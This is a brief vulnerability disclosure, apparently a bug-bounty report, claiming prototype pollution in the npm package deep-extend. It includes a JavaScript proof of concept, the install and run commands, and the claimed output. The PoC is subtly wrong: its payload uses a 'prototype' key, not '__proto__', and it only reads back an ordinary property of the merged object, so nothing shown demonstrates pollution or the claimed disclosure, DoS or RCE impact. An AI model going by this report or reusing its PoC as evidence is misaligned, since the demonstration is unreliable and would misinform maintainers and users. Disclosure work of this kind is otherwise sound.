# Description

`deep-extend` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var extnd = require('deep-extend');
var malicious_payload = '{"prototype": {"polluted": "Yes! Polluted"}}';

var a = {};
console.log("Before : " + a.oops);
object=extnd({}, JSON.parse(malicious_payload));
console.log("After : " + object.prototype.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i deep-extend # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Polluted
```
